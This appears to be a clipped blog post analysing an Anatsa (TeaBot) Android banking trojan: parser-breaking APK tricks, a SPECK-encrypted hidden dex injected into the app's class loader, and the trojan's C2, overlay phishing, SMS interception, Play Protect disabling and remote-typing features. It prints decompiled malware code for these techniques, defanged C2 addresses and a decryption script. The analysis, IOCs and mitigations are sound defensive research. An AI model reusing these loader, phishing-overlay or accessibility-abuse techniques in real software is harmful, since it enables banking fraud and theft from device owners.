---
title: "Unpacking an Android Banking Trojan: The App That Loads Code It Never Shipped"
source: https://dispatchersdotplayground.hashnode.dev/unpacking-an-android-banking-trojan-the-app-that-loads-code-it-never-shipped
source_host: dispatchersdotplayground.hashnode.dev
clip_date: 2026-11-19T10:50:58+08:00
trace_id: be608b3f-a7eb-4c3f-a75f-4bb9fd53dbdc
content_hash: e48ff815451a680fad82dd0ba805fd74b8ba7d197b313a4cb767bb36e157d876
status: synced
tags: []
series: null
feed_source: Stavro·Android逆向
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41d75244-d011-813e-b59e-ec1ce536be94
ioc:
  cves: []
  cwes: []
  hashes:
    - 554e71b4e5d2a172707b51edc8e0e22cba40858b69884e75228c12718c47e1ef
    - b38908400840ba325973f57c13b72b33c95c5342fab1f0e2b8d99059f4835c70
  domains: []
  tools: []
  techniques: []
---

*A teardown of an Anatsa (TeaBot) payload: parser traps, a SPECK-encrypted dex, and a class loader that isn't yours.*

I went looking for a Google Play dropper. Droppers are my favourite kind of Android malware because sooner or later they have to load code they didn't ship with, and that's where the interesting engineering is. What I pulled from MalwareBazaar turned out to be the thing a dropper installs: an Anatsa banking trojan payload. It still loads code it didn't ship with, just in a much nastier way. Depending on the vendor you read, the same family is called Anatsa (ThreatFabric), TeaBot (Cleafy) or Toddler. MalwareBazaar files it under the signature `TeaBot`, with `anatsa` only as a tag, so if `signature:anatsa` comes back empty, that's why.

The first surprise came before I read a single line of code. Quark crashed. apktool crashed. aapt segfaulted. The APK installs fine on Android.

You don't need a malware background to follow along. Everything this app does, it does with APIs most Android developers have touched: `Application.attachBaseContext`, `ClassLoader`, `AccessibilityService`, `WebView`, `BroadcastReceiver`. The difference is what it uses them for.

This article walks through the whole chain: the tricks that break the tooling, the packer that decrypts a hidden dex and injects it into the app's own class loader, and the banking trojan that comes out the other side. All code is from the decompiled sample (jadx, with the malware's encrypted strings inlined), trimmed for readability.

## The sample

|     |     |
| --- | --- |
| SHA-256 | `554e71b4e5d2a172707b51edc8e0e22cba40858b69884e75228c12718c47e1ef` |
| First seen | 2023-06-30 (MalwareBazaar, signature `TeaBot`, tag `anatsa`) |
| Package | `com.lbugkgtau.iuzdlpqzr` |
| Label | "Document AI Text Recognizer: Add-On" |
| Size | 3.1 MB, one dex, no native code |

Keep the label in mind. "Add-On" is not a random name.

## Breaking the tools before you read a line of code

Here's what Quark-Engine had to say about it:

```plaintext
  File ".../zipfile/__init__.py", line ..., in _update_crc
    raise BadZipFile("Bad CRC-32 for file %r" % self.name)
zipfile.BadZipFile: Bad CRC-32 for file 'AndroidManifest.xml'
```

And apktool:

```
I: Loading resource table...
Exception in thread "main" brut.androlib.AndrolibException: Invalid chunk type: expected=0x00000200, got=0x0000206e
```

When a tool crashes on a live sample, the crash isn't the end of the analysis. It's the first finding. So I parsed the ZIP by hand and compared what the central directory claims against what's actually on disk. 129 of the 130 entries were fine. One wasn't:

```
AndroidManifest.xml | method=0 (STORED) | compressed=5702 | uncompressed=16292 | CRC mismatch
```

A STORED entry isn't compressed, so both sizes must be equal. Here the bytes are all there, 16,292 of them, and the CRC checks out if you read all of them. Only the "compressed size" header was set to 5,702. Python's `zipfile` trusts that field, reads a third of the manifest, fails the CRC check and gives up. That one lie is enough to take out Quark and anything else built on Python's `zipfile`. Android doesn't use that field for stored entries, so the APK still installs.

That was trick one. In total I found eight:

| #   | Where | Trick | What breaks |
| --- | --- | --- | --- |
| 1   | ZIP entry | STORED manifest with a fake compressed size | Python `zipfile` → Quark |
| 2   | Manifest (binary XML) | Top-level chunk type zeroed (`0x0000` instead of `0x0003`) | Strict AXML decoders |
| 3   | Manifest string pool | String count inflated to 522 when only 121 offsets fit | Parsers read string data as offsets |
| 4   | Manifest elements | All 76 element chunks carry 8–28 junk bytes after their attributes | apktool: `Invalid chunk type (0)` |
| 5   | Manifest attributes | Attribute name strings blanked, decoy attributes with no resource ID | Name-based decoders print `=""` |
| 6   | `<application>` | `android:name` declared twice | Tools disagree on the entry point |
| 7   | `resources.arsc` string pools | 28 bytes of zero padding before the string data | apktool lands mid-string (`0x206e` is `"n "`) |
| 8   | `resources.arsc` package | 28 extra header bytes forged to look like a 838 KB chunk | Sequential parsers hit EOF |

Trick 8 is my favourite. A resource package header is normally 288 bytes. This one declares 316, and the 28 extra bytes are crafted to look like the start of another chunk:

```
header bytes 288..316: 01001c00 72cb0c00 ...
                       ^type=0x0001 (string pool)  ^size=838514
```

Android reads the declared header size and jumps straight past it. A parser that assumes "the header is 288 bytes and the next chunk starts right after" reads a string pool that claims to be 838 KB long, in a 15 KB file.

The common theme: Android trusts the *size* and *offset* fields, while many tools assume the *standard* layout. Every trick lives in that gap. I wrote a small repair script that rewrites a clean, unsigned copy for analysis (the original sample is never touched), plus a manifest decoder that resolves attribute names by resource ID the way Android does. After that, everything parsed.

## A manifest full of classes that don't exist

With the manifest decoded, it reads like a banking trojan's shopping list: `SEND_SMS`, `RECEIVE_SMS`, `READ_SMS`, `SYSTEM_ALERT_WINDOW`, `QUERY_ALL_PACKAGES`, `REQUEST_DELETE_PACKAGES`, plus an accessibility service and a high-priority SMS receiver:

```xml
<application
    android:label="Document AI Text Recognizer: Add-On"
    android:name="yws.vuuutkn.ekxykyuqa.luhcdeg"
    DUPLICATE_name="lsc.lwagkjd.ryjisteso.gvfhxdufgqfliyfljwwi"
    android:usesCleartextTraffic="true" ...>

    <service android:name="in.makaek.galbak.UIDNwaidobaWIODb"
        android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" ... />

    <receiver android:name="in.makaek.galbak.receiver.AIUbawuidBAWUdi"
        android:permission="android.permission.BROADCAST_SMS">
        <intent-filter android:priority="999">
            <action android:name="android.provider.Telephony.SMS_DELIVER" />
            <action android:name="android.provider.Telephony.SMS_RECEIVED" />
        </intent-filter>
    </receiver>
```

So I went to read `in.makaek.galbak.UIDNwaidobaWIODb`. It isn't there. Neither is anything else under `in.makaek.galbak`:

```
manifest components missing from dex: 17/17
```

The dex has 5,702 classes. Almost all of them are Tencent QQMail, Xiaomi push and Huawei HMS SDK code: real libraries, there to make the APK look like a normal SDK-heavy app and to bury what matters. What matters is 13 classes in packages like `gek.ydwrmup.uvwpcjavs` and `pbf.dhgiokj.pgfqwyikr`. Those 13 classes are a packer, and the two `android:name` values point into it.

When every component the manifest declares is missing, the APK is a shell. The real code gets loaded at runtime, before Android needs any of those classes.

## StubApp: the first code that runs

The first `android:name` is the Application class, and it's the first code that runs:

```java
/* compiled from: StubApp.java */
public class luhcdeg extends Application {
    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        new atpfjbgluefj(base).kwoxrwsaavqwd();   // patch resources (asset path)
        new rslqiexjf(base).qfftxkwqxi();          // decrypt + inject the dex
        wkgdrfcothunhvp.dksn(this, kqdiq.rshwbcowyckuyinkvvmnn, kqdiq.osfykdxacyexowdshshsm);
    }

    @Override
    public String getPackageName() {
        return kqdiq.oacvewccsclg;                  // decrypts to "com.lbugkgtau.iuzdlpqzr"
    }
}
```

Notice the `compiled from:` comment. The packer author stripped class names but left the source-file debug info, so jadx shows the original file names: `StubApp.java`, `DexLoader.java`, `DexCrypto.java`, `CoreComponentFactory.java`, `Const.java`. `StubApp` is also the name of 360 Jiagu's stub class, so this is at least Jiagu-inspired. The second `android:name` isn't an Application at all. It's an `AppComponentFactory` subclass, the Android 9+ hook that decides how every Activity, Service and Receiver gets instantiated. Declaring it as a duplicate `name` attribute hides it from tools that only keep one value per attribute.

`attachBaseContext` runs before any Activity, Service or Receiver is created, which makes it the right place to swap the code out.

The packer's constants are XOR-encrypted, with a key picked by the second argument:

```java
public static String osfykdxacyexowdshshsm = rsoemgffljy.usxbxjxwhdlbvr("恊恄恀思恅恆恆恆...", 2);
public static String bmhcfnfbvexabe        = rsoemgffljy.usxbxjxwhdlbvr("恟恞恒恕恜", 2);   // "lmafo"
public static String svnhpsymdpkgmckxbmqy  = rsoemgffljy.usxbxjxwhdlbvr("恂恚恅", 2);     // "qiv"
public static String ipkctjevjqm = "捨뺑戚聳踖曡㒕躚\udafdﶃ킎";                    // not encrypted. Hmm.
```

Key table 2 is a single character, `24627`. Every string is just `c ^ 24627`. Decrypted, they point at `assets/lmafo/*.qiv`. And the one constant that *isn't* encrypted, `ipkctjevjqm`, turns out to be the key for everything else.

## Decrypting the payload

There's exactly one file matching that pattern: `assets/lmafo/mimlwef.qiv`, 327 KB, starting with `78 9c`, a zlib header. The class that reads it calls itself `DexCrypto`:

```java
/* compiled from: DexCrypto.java */
public static void xhrrcnexeobqr(InputStream input, OutputStream output) throws Exception {
    InflaterInputStream is = new InflaterInputStream(input);       // 1. zlib
    InflaterOutputStream os = new InflaterOutputStream(output);    // 3. zlib again
    apkg(is, os);                                                   // 2. decrypt in between
    os.close();
    is.close();
}
```

So it's zlib, then something, then zlib again. The "something" builds a key schedule and encrypts its own state every 8 bytes:

```java
private static int[] mxmftd(int[] key) {           // key schedule: 4 words in, 27 round keys out
    int[] rk = new int[27];
    int a = key[0];
    rk[0] = a;
    int[] l = {key[1], key[2], key[3]};
    for (int i = 0; i < 26; i++) {
        l[i % 3] = (((l[i % 3] >>> 8) | (l[i % 3] << 24)) + a) ^ i;   // ROR 8, add, xor round
        a = ((a << 3) | (a >>> 29)) ^ l[i % 3];                        // ROL 3, xor
        rk[i + 1] = a;
    }
    return rk;
}
```

Rotate right by 8, add, XOR; rotate left by 3, XOR. That's the round function of **SPECK**, the lightweight block cipher NSA published in 2013. Four 32-bit key words and 27 rounds means SPECK-64/128. The block function `irpy` is the same round, unrolled 27 times. And because the cipher encrypts its own state every 8 bytes and XORs the result into the data, it runs as a stream cipher in **OFB mode**.

The key comes from that unencrypted constant: its 12 UTF-16 characters split into 8 for the key and 4 for the IV. One gotcha: take the literal from smali, not from jadx. It contains a lone surrogate (`\udafd`), and you don't want a renderer "fixing" it for you:

```
const-string v0, "捨뺑戚聳踖曡㒕躚\udafdﶃ킎"
```

Porting it to Python is mechanical. I kept the Java index arithmetic as-is, because "cleaning it up" is how you introduce bugs:

```python
k  = [0x6368, 0xBE91, 0x621A, 0xE684, 0x8073, 0x8E16, 0x66E1, 0x3495, 0x8E9A, 0xDAFD, 0xFD83, 0xD08E]
key = [k[0] | (k[1] << 16), (k[3] << 16) | k[2], (k[5] << 16) | k[4], (k[7] << 16) | k[6]]
iv  = [(k[9] << 16) | k[8], k[10] | (k[11] << 16)]
rk  = key_schedule(key)

data = bytearray(zlib.decompress(asset))       # layer 1
st = list(iv)
for pos in range(len(data)):                   # layer 2: SPECK-64/128, OFB
    if pos % 8 == 0:
        encrypt_state(rk, st)
    data[pos] ^= (st[(pos % 8) // 4] >> ((pos % 4) * 8)) & 0xFF
payload = zlib.decompress(bytes(data))         # layer 3
```

```
asset 327054B -> inflated 326948B -> payload 774176B, magic b'dex\n035\x00'
```

A valid dex on the first try. With a bespoke cipher you'd normally expect an evening of off-by-ones. Here a single wrong bit would have broken the second zlib layer, so a clean decompress is proof the port is right. And 15 of the 17 missing manifest classes are in it.

## Injecting into dexElements (no DexClassLoader in sight)

This is the part I came for. If you grep this sample for `DexClassLoader`, `InMemoryDexClassLoader` or `PathClassLoader.<init>`, you get nothing. `DexLoader` doesn't create a new class loader. It modifies the one the app already has:

```java
/* compiled from: DexLoader.java */
private void crwtswc(File versionDir) throws ... {
    ClassLoader classLoader = context.getClassLoader();                 // the app's own PathClassLoader
    Field pathListField = yekyyse.hxumyhsyk(classLoader, "pathList");
    Object pathList = pathListField.get(classLoader);

    Field dexElementsField = yekyyse.hxumyhsyk(pathList, "dexElements");
    Object[] dexElements = (Object[]) dexElementsField.get(pathList);

    Method makeDexElements;
    if (Build.VERSION.SDK_INT >= 21 && Build.VERSION.SDK_INT < 23) {
        makeDexElements = yekyyse.wmnvtcekvl(pathList, "makeDexElements", ArrayList.class, File.class, ArrayList.class);
    } else {
        makeDexElements = yekyyse.wmnvtcekvl(pathList, "makePathElements", List.class, File.class, List.class);
    }
    Object[] addElements = (Object[]) makeDexElements.invoke(pathList, decryptedFiles, versionDir, suppressed);

    Object[] newElements = (Object[]) Array.newInstance(componentType, dexElements.length + addElements.length);
    System.arraycopy(dexElements, 0, newElements, 0, dexElements.length);
    System.arraycopy(addElements, 0, newElements, dexElements.length, addElements.length);
    dexElementsField.set(pathList, newElements);                        // payload is now "part of the app"
}
```

A quick refresher on why this works: `PathClassLoader` extends `BaseDexClassLoader`, which keeps a `DexPathList` (`pathList`). Inside it is an array of `Element` s (`dexElements`), one per dex or jar on the class path. `findClass()` walks that array in order. Append an element for your decrypted dex and every class in it becomes resolvable through the app's normal class loader.

That's exactly what Android needs. When the system starts `in.makaek.galbak.UIDNwaidobaWIODb` as an accessibility service, it asks the app's class loader for that name, and the packer has made sure it finds it. MultiDex did this for years on pre-Lollipop devices, and hot-fix frameworks like Tinker still do. It's the same technique with a different purpose.

Two more details from the same class:

-   Before decrypting, it wipes the target directory. After injecting, it deletes the decrypted files again. The plaintext dex only exists on disk for a moment.
-   A sibling routine does the same for resources: it copies `assets/qpoyqi.vmx` out and adds it as an extra asset path. That file isn't in this build. The `try/catch` swallows the error and nobody notices.

> 💡 *If you're hunting for loaders, grep for the strings* `pathList`*,* `dexElements`*,* `makePathElements` *and* `makeDexElements` *in addition to the class-loader constructors. Reflection on those fields from* `attachBaseContext` *is about as clear a signal as you'll get.*

## Stage 2: the actual banking trojan

Running jadx on the decrypted dex gives you 363 classes, and almost every string looks like this:

```java
private static short[] $ = {1580, 1550, 1550, 1544, 1565, 1561, 1600, 1582, ...};

private static String $(int i, int i2, int i3) {
    char[] cArr = new char[i2 - i];
    for (int i4 = 0; i4 < i2 - i; i4++) {
        cArr[i4] = (char) ($[i + i4] ^ i3);
    }
    return new String(cArr);
}
// ...
uRLConnection.setRequestProperty($(0, 14, 1645), $(14, 19, 8383));
```

Each class has its own table, and each call takes a slice of it and XORs it with a per-call key. Since everything is static, I wrote a script that parses each class's table and rewrites every `$(start, end, key)` call into its plaintext literal. One catch: jadx puts inner classes in the same file, and an inner class can have its *own* `$` table, so the script has to follow Java's scoping rules. My first version didn't: it used the first table in each file, so strings in inner classes were either skipped or decoded with the outer class's table. Fixing the scoping recovered 12 more strings. After the fix, 1,567 strings across 160 classes came back:

```java
uRLConnection.setRequestProperty("Accept-Charset", "UTF-8");
```

Everything below comes from that inlined copy.

### The C2

```java
static {
    HashSet hashSet = new HashSet();
    f360a = hashSet;
    hashSet.add("virus");
    f360a.add("uninstaller");
    f360a.add("security");
    f360a.add("cleaner");
    f361b = new String[]{"http://185.215.113[.]31:85/api/", "http://91.215.85[.]55:85/api/"};
    c = 0;
}
```

(Defanged by me.) Two hard-coded panels, plain HTTP on port 85, rotated by index. I didn't contact them, and you shouldn't either. Both IPs also appear in [Zscaler ThreatLabz's IOC table](https://www.zscaler.com/blogs/security-research/technical-analysis-anatsa-campaigns-android-banking-malware-active-google) for a different Anatsa dropper campaign reported in 2024, so the same infrastructure was in use a year apart. The keyword set above it is an anti-removal list: the words found in the names of antivirus, cleaner and uninstaller apps.

Requests are JSON POSTed as `application/xml`, because why not:

```java
httpURLConnection2.setRequestMethod("POST");
httpURLConnection2.setRequestProperty("Content-Type", "application/xml");
httpURLConnection2.setDoOutput(true);
```

The bot registers with `android_id`, manufacturer and model, battery level, network country ISO and locale. I found no on-device country or emulator checks. Targeting is decided on the server, based on what the bot reports. The response keys show what the operator can control: `commands`, `domains`, `active_injects`, `injects_version`, `keyloggers_version`, `hide_sms`, `lock_device`, `gauth_confirm`, `botupdate`.

### Accessibility, in eleven languages

Everything this trojan does runs through its accessibility service. Until the victim enables it, the main service keeps nagging with a notification ("Enable accessibility", or "Habilitar accesibilidad" on Spanish devices) and opens `ACCESSIBILITY_SETTINGS`. Once it's on, the bot uses it to click through every dialog that stands in its way. To find the right button on any device, it carries localized labels:

```java
switch (c) {
    case 0:  return "información de la aplicación";
    case 1:  return "应用程序信息";
    case 2:  return "inf. o aplikácii";
    case 3:  return "app-info";
    case 4:  return "infos sur l'appli";
    case 5:  return "info da app";
    case 6:  return "معلومات حول التطبيق";
    case 7:  return "о приложен";
    default: return "app info";
}
```

That's "App info" in Spanish, Chinese, Slovak, Dutch, French, Portuguese, Arabic and Russian. The same class has variants for "allow", "default SMS app", "ignore battery optimizations", "force stop", "uninstall" and "reset", in English, Spanish, German, French, Italian, Dutch, Portuguese, Czech/Slovak, Arabic, Russian and Chinese. Some are used to grant itself permissions, the others to spot the screens a victim would use to get rid of it.

### Overlay injects

When the victim opens a targeted banking app, the bot launches its inject activity on top of it. The fake login page is plain HTML fetched from the C2 (`getbotinjects`, per target package):

```java
@Override
protected void onStart() {
    super.onStart();
    WebView webView = new WebView(this);
    webView.getSettings().setJavaScriptEnabled(true);
    webView.setWebViewClient(new c());
    webView.setWebChromeClient(new b());
    webView.addJavascriptInterface(new d(this), "Android");
    webView.loadDataWithBaseURL(null, f337b, "text/html", "UTF-8", null);
    setContentView(webView);
    getWindow().addFlags(8192);                        // FLAG_SECURE
}
```

The HTML hands the stolen credentials back through a JavaScript bridge:

```java
@JavascriptInterface
public void returnResult(String str) {
    JSONObject jSONObject = new JSONObject();
    jSONObject.put("application", uibwduIABuIaw.c);   // which bank
    jSONObject.put("data", str);                        // what the victim typed
    dVar.f314a.d(this.f339a, "captured_injects", jSONObject.toString());
    dVar.f314a.i(this.f339a, "iactive:" + uibwduIABuIaw.c, false);   // one-shot: disable this inject
    this.f339a.finish();
}
```

Two details I like, in the professional sense. First, each inject fires once: after a capture it disables itself, so the victim doesn't see the same "please log in again" screen twice and get suspicious. Second, `addFlags(8192)` is `FLAG_SECURE`, the flag banking apps use to block screenshots. Here it protects the phishing page from screenshots and screen recording.

### SMS, and why it wants to be your SMS app

```java
@Override
public void onReceive(Context context, Intent intent) {
    Bundle extras = intent.getExtras();
    String format = extras.getString("format");
    Object[] pdus = (Object[]) extras.get("pdus");
    String str = "";
    for (int i = 0; i < pdus.length; i++) {
        SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdus[i], format);
        str = str + "SMS from " + msg.getOriginatingAddress() + ": " + msg.getMessageBody();
    }
    dVar.f314a.d(context, "logged_sms", str);
    abortBroadcast();
}
```

`abortBroadcast()` is a leftover from the pre-KitKat days. Since Android 4.4, `SMS_RECEIVED` can't be aborted. What actually controls which SMS a user sees is being the **default SMS app**, which receives `SMS_DELIVER`. That explains the two manifest components that weren't in stage 2 either: a WAP-push receiver and a "respond via message" service. Android requires both to be declared before an app can be offered as the default SMS handler. They're never implemented; they only exist to qualify. And the accessibility clicker has a localized "default SMS app" string to accept the prompt.

### Turning off Play Protect, 25 minutes later

```java
public static void a(UIDNwaidobaWIODb svc, AccessibilityEvent event) {
    boolean s = in.makaek.galbak.util.b.s(event);    // event from Play Store / AppGallery / Galaxy Store?
    long now = System.currentTimeMillis();
    if (now - UIDNwaidobaWIODb.f >= 1500000 && !f330a) {
        if (!s) { b(svc); return; }                   // not there yet: open Play Protect settings
        for (AccessibilityNodeInfo node : b.b(UIDNwaidobaWIODb.i, "TextView")) {
            if (node.isClickable() && (node.getText() == null || node.getText().toString().isEmpty())) {
                node.performAction(16);                    // ACTION_CLICK
                in.makaek.galbak.util.e.a("GP DISABLE|METHOD1");
            }
        }
        // ... confirm with the second Button, then BACK, BACK, HOME
    }
}
```

And `b()` is a direct jump into Google Play Services' Play Protect screen:

```java
public static void b(UIDNwaidobaWIODb svc) {
    Intent intent = new Intent();
    intent.setComponent(new ComponentName("com.google.android.gms",
            "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"));
    intent.addFlags(268435456);                       // FLAG_ACTIVITY_NEW_TASK
    svc.startActivity(intent);
}
```

`UIDNwaidobaWIODb.f` is set when the accessibility service handles its first event. `1500000` ms is 25 minutes. So the bot waits 25 minutes after getting accessibility, opens the Play Protect settings, clicks the toggle and the confirmation, then presses Back twice and Home (`performGlobalAction(1)`, `(1)`, `(2)`) to get the evidence off the screen. The delay keeps it away from the moment the victim is still paying attention to the phone. The log line on success is refreshingly honest: `GP PROTECT Disabled`.

### Remote control

The command set lives in one class per command: `start_client`, `open_inject`, `grab_google_auth`, `get_accounts`, `change_pass`, `reset_pass`, `ask_syspass`, `ask_perms`, `swipe_down`, `activate_screen`, `mute_phone`, `app_delete`, `kill_bot` and a few more. `start_client` opens a session to an IP and port the operator chooses:

```java
String ip = b2.a().optString("ip");
short port = Short.parseShort(b2.a().optString("port"));
jSONObject.put("result", "Launching client... check sys logs");
ninoiadiowanoi.o(ip, port);
```

Inside that session, the operator can type into any text field on screen. The bot finds the right field by its on-screen coordinates and sets its text through accessibility:

```java
for (AccessibilityNodeInfo node : b.b(rootInActiveWindow, "EditText")) {
    Rect rect = new Rect();
    node.getBoundsInScreen(rect);
    if (rect.left == x && rect.bottom == y) {
        Bundle bundle = new Bundle();
        bundle.putString("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", text);
        node.performAction(2097152, bundle);             // ACTION_SET_TEXT
    }
}
```

This is on-device fraud. The transfer is made on the victim's own phone, from the victim's own banking session, so device fingerprinting and "new device" checks on the bank's side see nothing unusual.

## What Quark saw

Since I started with Quark crashing, here's how the picture changes layer by layer:

| What I scanned | Quark result | What was really there |
| --- | --- | --- |
| Original APK | Crash (`BadZipFile`) | Trick #1 |
| Repaired outer APK | High Risk, but the hits are packer reflection and Tencent SDK code | A packer and a lot of filler |
| Decrypted stage 2 | High Risk, 42 hits at ≥80% confidence in `in.makaek.galbak` | The banking trojan |

Same verdict three times, three very different realities. Quark is great at telling you what the code *can* do. It can't tell you whether you're looking at the right code.

## How it gets on a phone

The label "Document AI Text Recognizer: Add-On" fits [ThreatFabric's report](https://threatfabric.com/blogs/anatsa-hits-uk-and-dach-with-new-campaign) on the 2023 Anatsa campaign targeting the US, UK and DACH region. The droppers sat on Google Play posing as PDF and document readers. After install, they downloaded the payload and presented it to the victim as an **add-on** for the app they had just installed. The dropper passes store review because it contains nothing malicious. The payload is never on the store at all. I can't tie this exact hash to that report, but the name, the timing and the infrastructure all fit.

## IOCs

```
APK SHA-256       554e71b4e5d2a172707b51edc8e0e22cba40858b69884e75228c12718c47e1ef
Stage 2 dex       b38908400840ba325973f57c13b72b33c95c5342fab1f0e2b8d99059f4835c70
Package           com.lbugkgtau.iuzdlpqzr
Payload namespace in.makaek.galbak
C2                hxxp://185.215.113[.]31:85/api/
                  hxxp://91.215.85[.]55:85/api/
Encrypted asset   assets/lmafo/mimlwef.qiv
```

## Conclusion

**For developers**: there's no code fix for "the user granted accessibility to malware", but you can make that grant less useful. On Android 14+, mark credential and payment fields as accessibility-sensitive, so that only services that declare themselves real accessibility tools can read or act on them:

```kotlin
passwordField.setAccessibilityDataSensitive(View.ACCESSIBILITY_DATA_SENSITIVE_YES)
```

And on Android 12+ you can at least see which enabled services don't claim to be accessibility tools, and feed that into your risk scoring:

```kotlin
val am = getSystemService(AccessibilityManager::class.java)
val nonTools = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
    .filter { !it.isAccessibilityTool }
```

Don't treat SMS one-time codes as a second factor against malware that can be your user's SMS app. And remember that `FLAG_SECURE` works for the attacker too.

**For researchers**: when tools crash on a live sample, the crash is evidence. Look at what the parser assumed versus what the header says. Count the manifest components that are actually in the dex. When they're missing, the APK is a shell, and Quark results describe the shell. And grep for `dexElements`, not just `DexClassLoader`.

The class loader you're reading might not be the one the app is running.

## References

**The sample and the campaign**

-   [MalwareBazaar: sample 554e71b4…](https://bazaar.abuse.ch/sample/554e71b4e5d2a172707b51edc8e0e22cba40858b69884e75228c12718c47e1ef/)
-   [ThreatFabric: Anatsa banking Trojan hits UK, US and DACH with new campaign](https://threatfabric.com/blogs/anatsa-hits-uk-and-dach-with-new-campaign)
-   [Zscaler ThreatLabz: Technical Analysis of Anatsa Campaigns](https://www.zscaler.com/blogs/security-research/technical-analysis-anatsa-campaigns-android-banking-malware-active-google)
-   [AlienVault OTX: indicators from the Zscaler report](https://otx.alienvault.com/pulse/6655bb0af84356806f384f5a)
-   [The Hacker News: Anatsa, also known as TeaBot and Toddler](https://thehackernews.com/2025/07/anatsa-android-banking-trojan-hits.html)

**Android internals**

-   [AOSP: `DexPathList.java`](https://cs.android.com/android/platform/superproject/+/main:libcore/dalvik/src/main/java/dalvik/system/DexPathList.java) (`dexElements`, `makePathElements`)
-   [Android Developers Blog: Getting Your SMS Apps Ready for KitKat](https://android-developers.googleblog.com/2013/10/getting-your-sms-apps-ready-for-kitkat.html) (default SMS app, `SMS_DELIVER`)
-   [`View.setAccessibilityDataSensitive()`](https://developer.android.com/reference/android/view/View#setAccessibilityDataSensitive\(int\))
-   [`AccessibilityServiceInfo.isAccessibilityTool()`](https://developer.android.com/reference/android/accessibilityservice/AccessibilityServiceInfo#isAccessibilityTool\(\))

**Crypto**

-   [Beaulieu et al., The SIMON and SPECK Families of Lightweight Block Ciphers (IACR ePrint 2013/404)](https://eprint.iacr.org/2013/404)

**Tools**

> *All analysis in this article was static and done in an isolated environment. The sample was never installed or executed, and no attacker infrastructure was contacted. The techniques here are shared for defensive research.*
